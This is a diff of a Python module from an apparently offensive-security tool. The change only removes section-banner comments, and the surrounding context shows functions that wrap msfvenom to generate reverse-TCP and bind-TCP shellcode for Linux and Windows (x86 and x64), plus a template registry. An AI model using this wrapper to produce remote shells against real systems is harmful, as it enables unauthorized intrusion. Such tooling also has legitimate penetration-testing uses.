@@ -29,11 +29,6 @@ def _generate_with_msfvenom(os: str, arch: str, type: str, ip: str, port: int) -
         raise
 
 
-# ============================================================================
-# Linux x86 Templates
-# ============================================================================
-
-
 def LINUX_X86_REVERSE_TCP(ip: str, port: int) -> bytes:
     """Linux x86 reverse TCP shellcode"""
     return _generate_with_msfvenom("linux", "x86", "reverse", ip, port)
@@ -42,11 +37,6 @@ def LINUX_X86_REVERSE_TCP(ip: str, port: int) -> bytes:
 def LINUX_X86_BIND_TCP(ip: str, port: int) -> bytes:
     """Linux x86 bind TCP shellcode"""
     return _generate_with_msfvenom("linux", "x86", "bind", "0.0.0.0", port)
-
-
-# ============================================================================
-# Linux x64 Templates
-# ============================================================================
 
 
 def LINUX_X64_REVERSE_TCP(ip: str, port: int) -> bytes:
@@ -59,11 +49,6 @@ def LINUX_X64_BIND_TCP(ip: str, port: int) -> bytes:
     return _generate_with_msfvenom("linux", "x64", "bind", "0.0.0.0", port)
 
 
-# ============================================================================
-# Windows x86 Templates
-# ============================================================================
-
-
 def WINDOWS_X86_REVERSE_TCP(ip: str, port: int) -> bytes:
     """Windows x86 reverse TCP shellcode"""
     return _generate_with_msfvenom("windows", "x86", "reverse", ip, port)
@@ -72,11 +57,6 @@ def WINDOWS_X86_REVERSE_TCP(ip: str, port: int) -> bytes:
 def WINDOWS_X86_BIND_TCP(ip: str, port: int) -> bytes:
     """Windows x86 bind TCP shellcode"""
     return _generate_with_msfvenom("windows", "x86", "bind", "0.0.0.0", port)
-
-
-# ============================================================================
-# Windows x64 Templates
-# ============================================================================
 
 
 def WINDOWS_X64_REVERSE_TCP(ip: str, port: int) -> bytes:
@@ -88,10 +68,6 @@ def WINDOWS_X64_BIND_TCP(ip: str, port: int) -> bytes:
     """Windows x64 bind TCP shellcode"""
     return _generate_with_msfvenom("windows", "x64", "bind", "0.0.0.0", port)
 
-
-# ============================================================================
-# Template Registry
-# ============================================================================
 
 SHELLCODE_TEMPLATES: dict[str, dict[str, dict[str, Callable[[str, int], bytes]]]] = {
     "LINUX": {
